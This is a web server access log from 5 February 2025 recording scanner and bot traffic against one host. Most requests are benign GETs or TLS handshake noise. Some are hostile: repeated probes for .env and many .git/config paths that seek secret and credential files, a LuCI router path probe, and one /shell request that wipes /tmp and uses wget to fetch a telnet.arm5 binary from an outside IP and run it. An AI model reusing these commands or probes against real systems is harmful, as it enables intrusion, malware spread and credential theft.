78.153.140.148 - - [05/Feb/2025:03:37:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:03:37:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.43.33.210 - - [05/Feb/2025:04:10:43 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
80.82.77.202 - - [05/Feb/2025:04:38:17 +0000] "\x16\x03\x02\x01o\x01" 400 533 "-" "-"
45.156.129.135 - - [05/Feb/2025:04:39:48 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:04:55:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:04:55:59 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
20.49.1.177 - - [05/Feb/2025:05:03:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.49.1.177 - - [05/Feb/2025:05:03:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.255.166.90 - - [05/Feb/2025:05:16:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
149.102.136.201 - - [05/Feb/2025:05:35:23 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5" 400 533 "-" "-"
35.240.127.158 - - [05/Feb/2025:06:01:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
46.19.138.234 - - [05/Feb/2025:06:19:07 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.79.118.200 - - [05/Feb/2025:06:22:58 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
45.148.10.242 - - [05/Feb/2025:06:24:42 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:24:42 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale" "-"
4.151.220.177 - - [05/Feb/2025:06:29:39 +0000] "MGLNDD_34.176.179.0_80\n" 400 533 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:37:19 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
45.148.10.242 - - [05/Feb/2025:06:37:19 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale" "-"
78.153.140.148 - - [05/Feb/2025:06:47:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:06:47:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.168.40.198 - - [05/Feb/2025:06:55:06 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
128.199.219.78 - - [05/Feb/2025:07:32:50 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.219.78 - - [05/Feb/2025:07:32:50 +0000] "\x16\x03\x01\x01\x02\x01" 400 533 "-" "-"
45.79.181.94 - - [05/Feb/2025:07:50:13 +0000] "\x16\x03\x01\x01\n" 400 533 "-" "-"
45.79.181.94 - - [05/Feb/2025:07:50:15 +0000] "\x16\x03\x01\x01\n" 400 533 "-" "-"
78.153.140.148 - - [05/Feb/2025:07:55:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:07:55:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
34.78.26.243 - - [05/Feb/2025:07:55:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
128.199.210.238 - - [05/Feb/2025:08:16:17 +0000] "\x16\x03\x01\x01\x02\x01" 400 533 "-" "-"
78.153.140.148 - - [05/Feb/2025:08:43:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:08:43:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.80 - - [05/Feb/2025:08:49:48 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
198.235.24.158 - - [05/Feb/2025:08:58:17 +0000] "\x16\x03\x01" 400 533 "-" "-"
198.235.24.158 - - [05/Feb/2025:08:58:17 +0000] "\x16\x03\x01" 400 533 "-" "-"
80.181.178.51 - - [05/Feb/2025:08:58:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
185.91.127.88 - - [05/Feb/2025:08:59:20 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.91.127.88 - - [05/Feb/2025:08:59:20 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0"
185.91.127.88 - - [05/Feb/2025:08:59:20 +0000] "GET /sitemap.xml HTTP/1.1" 302 350 "-" "Mozilla/5.0"
45.144.212.139 - - [05/Feb/2025:09:04:46 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)"
64.23.201.216 - - [05/Feb/2025:09:11:04 +0000] "GET /libs/js/iframe.js HTTP/1.0" 302 350 "-" "xfa1"
79.11.41.22 - - [05/Feb/2025:09:38:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
64.62.156.75 - - [05/Feb/2025:09:43:43 +0000] "\x16\x03\x01" 400 533 "-" "-"
205.210.31.53 - - [05/Feb/2025:09:50:07 +0000] "\x16\x03\x01" 400 533 "-" "-"
205.210.31.53 - - [05/Feb/2025:09:50:07 +0000] "\x16\x03\x01" 400 533 "-" "-"
24.106.221.230 - - [05/Feb/2025:09:50:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
4.156.21.114 - - [05/Feb/2025:10:03:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
125.227.160.116 - - [05/Feb/2025:10:20:50 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
128.199.252.54 - - [05/Feb/2025:10:22:36 +0000] "\x16\x03\x01\x01\x02\x01" 400 533 "-" "-"
128.199.252.54 - - [05/Feb/2025:10:22:36 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.148 - - [05/Feb/2025:10:32:09 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:10:32:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
117.132.188.204 - - [05/Feb/2025:10:50:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
8.217.171.143 - - [05/Feb/2025:10:50:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
8.217.171.143 - - [05/Feb/2025:10:50:50 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
8.217.171.143 - - [05/Feb/2025:10:50:50 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
8.217.171.143 - - [05/Feb/2025:10:50:51 +0000] "GET / HTTP/1.1" 200 1761 "http://34.176.179.0/favicon.ico" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
5.228.115.161 - - [05/Feb/2025:11:00:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
128.199.196.44 - - [05/Feb/2025:11:12:08 +0000] "\x16\x03\x01\x01\x02\x01" 400 533 "-" "-"
128.199.196.44 - - [05/Feb/2025:11:12:10 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.242.226.10 - - [05/Feb/2025:11:46:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /production/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /build/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /sites/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /tmp/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /app/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /debug/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /blog/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /web/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /beta/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:47 +0000] "GET /assets/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
